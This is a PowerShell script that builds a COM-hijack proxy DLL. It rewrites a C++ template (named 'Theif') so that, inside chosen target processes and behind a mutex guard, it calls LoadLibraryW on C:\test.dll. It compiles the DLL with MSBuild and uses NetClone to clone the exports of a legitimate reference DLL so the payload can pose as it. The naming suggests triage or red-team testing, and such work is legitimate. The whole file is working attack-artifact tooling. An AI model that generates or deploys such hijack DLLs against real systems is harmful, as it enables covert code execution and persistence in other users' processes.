param(
    [Parameter(Mandatory = $true)]
    [string[]]$TargetProcesses,

    [Parameter(Mandatory = $true)]
    [string]$ReferenceDll,

    [string]$KoppelingRoot,
    [string]$NetClonePath,
    [string]$OutputPath,
    [string]$MsBuildPath
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'
$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
$templatePath = Join-Path $scriptDirectory '..\assets\theif-main-template.cpp'
. (Join-Path $scriptDirectory 'ComHijackHost.Common.ps1')

function Normalize-TargetProcessNames {
    param([string[]]$ProcessNames)

    return @($ProcessNames | ForEach-Object {
        $name = $_.Trim().ToLowerInvariant()
        if (-not $name.EndsWith('.exe')) {
            $name = '{0}.exe' -f $name
        }

        $name
    })
}

function New-MutexName {
    param([string[]]$ProcessNames)

    $suffix = ($ProcessNames | ForEach-Object {
        $_.ToLowerInvariant().Replace('.exe', '') -replace '[^a-z0-9]', '_'
    }) -join '_'

    return 'Local\\ComHijackTriageLoadLibrary_{0}' -f $suffix
}

function New-ProcessGuardBlock {
    param([string[]]$ProcessNames)

    $processChecks = @($ProcessNames | ForEach-Object {
        ('processName != L"{0}"' -f $_.ToLowerInvariant())
    }) -join ' && '

    return @"
			if ($processChecks) {
				return 0;
			}
"@
}

function New-GeneratedMainSource {
    param(
        [string]$TemplateText,
        [string]$ProcessGuardBlock,
        [string]$MutexName
    )

    if (-not $TemplateText.Contains('__PROCESS_GUARD__')) {
        throw 'The template is missing the __PROCESS_GUARD__ marker.'
    }

    $payloadBlock = @"
			STARTUPINFOW si = { 0 };
			PROCESS_INFORMATION pi = { 0 };
			si.cb = sizeof(si);

			wchar_t commandLine[] = L"__PAYLOAD_COMMAND__";
			if (CreateProcessW(nullptr, commandLine, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
				CloseHandle(pi.hThread);
				CloseHandle(pi.hProcess);
			}
"@
    $payloadReplacement = @"
			static HANDLE guardMutex = nullptr;
			guardMutex = CreateMutexW(nullptr, FALSE, L"$MutexName");
			if (guardMutex == nullptr || GetLastError() == ERROR_ALREADY_EXISTS) {
				if (guardMutex != nullptr) {
					CloseHandle(guardMutex);
					guardMutex = nullptr;
				}
				return 0;
			}

			LoadLibraryW(L"C:\\test.dll");
"@

    $withGuard = $TemplateText.Replace('__PROCESS_GUARD__', $ProcessGuardBlock)
    $generated = $withGuard.Replace($payloadBlock, $payloadReplacement)
    if ($generated -eq $withGuard) {
        throw 'Unable to replace the template payload block with the LoadLibraryW payload.'
    }

    return $generated
}

$normalizedTargetProcesses = Normalize-TargetProcessNames -ProcessNames $TargetProcesses
$KoppelingRoot = Resolve-ComHijackKoppelingRoot -PreferredRoot $KoppelingRoot -ScriptDirectory $scriptDirectory -RequiredRelativePath 'Theif\Theif.vcxproj' -HydrateIfMissing
$MsBuildPath = Resolve-ComHijackMsBuildPath -PreferredMsBuildPath $MsBuildPath
if ([string]::IsNullOrWhiteSpace($NetClonePath)) {
    $NetClonePath = Join-Path $KoppelingRoot 'Bin\NetClone.exe'
}
if (-not (Test-Path -LiteralPath $NetClonePath)) {
    $seededNetClone = Install-ComHijackPackagedNetCloneRuntime -KoppelingRoot $KoppelingRoot -ScriptDirectory $scriptDirectory
    if ($seededNetClone) {
        $NetClonePath = Join-Path $KoppelingRoot 'Bin\NetClone.exe'
    }
}
if ([string]::IsNullOrWhiteSpace($OutputPath)) {
    $safeName = ($normalizedTargetProcesses | ForEach-Object { $_.Replace('.exe', '') }) -join '-'
    $OutputPath = Join-Path $scriptDirectory ("..\artifacts\payloads\theif-loadlibrary-{0}.dll" -f $safeName)
}

$mainCppPath = Join-Path $KoppelingRoot 'Theif\main.cpp'
$projectPath = Join-Path $KoppelingRoot 'Theif\Theif.vcxproj'
$builtDllPath = Join-Path $KoppelingRoot 'Theif\Bin\x64\Theif.dll'
$outputDirectory = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDirectory)) {
    New-Item -ItemType Directory -Path $outputDirectory -Force | Out-Null
}

foreach ($requiredPath in @($templatePath, $ReferenceDll, $NetClonePath, $MsBuildPath, $projectPath, $mainCppPath)) {
    $resolvedPath = [System.IO.Path]::GetFullPath($requiredPath)
    if (-not (Test-Path -LiteralPath $resolvedPath)) {
        throw "Required path not found: $requiredPath"
    }
}

$templateText = Get-Content -LiteralPath $templatePath -Raw
$guardBlock = New-ProcessGuardBlock -ProcessNames $normalizedTargetProcesses
$mutexName = New-MutexName -ProcessNames $normalizedTargetProcesses
$generated = New-GeneratedMainSource -TemplateText $templateText -ProcessGuardBlock $guardBlock -MutexName $mutexName
$original = Get-Content -LiteralPath $mainCppPath -Raw

try {
    [System.IO.File]::WriteAllText($mainCppPath, $generated, [System.Text.Encoding]::ASCII)

    $originalPath = $env:PATH
    try {
        Remove-Item Env:PATH -ErrorAction SilentlyContinue
        & $MsBuildPath $projectPath /t:Build /p:Configuration=Dyn-NetClone /p:Platform=x64 /p:PlatformToolset=v143 /p:PostBuildEventUseInBuild=false | Out-Host
        if ($LASTEXITCODE -ne 0) {
            throw 'MSBuild failed while building the LoadLibrary proxy DLL.'
        }
    } finally {
        if ($null -eq $originalPath) {
            Remove-Item Env:PATH -ErrorAction SilentlyContinue
        } else {
            $env:PATH = $originalPath
        }
    }

    Copy-Item -LiteralPath $builtDllPath -Destination $OutputPath -Force

    & $NetClonePath --target $OutputPath --output $OutputPath --reference $ReferenceDll | Out-Null
    if ($LASTEXITCODE -ne 0) {
        throw "NetClone failed while cloning exports from $ReferenceDll."
    }

    Get-Item -LiteralPath $OutputPath
} finally {
    [System.IO.File]::WriteAllText($mainCppPath, $original, [System.Text.Encoding]::ASCII)
}
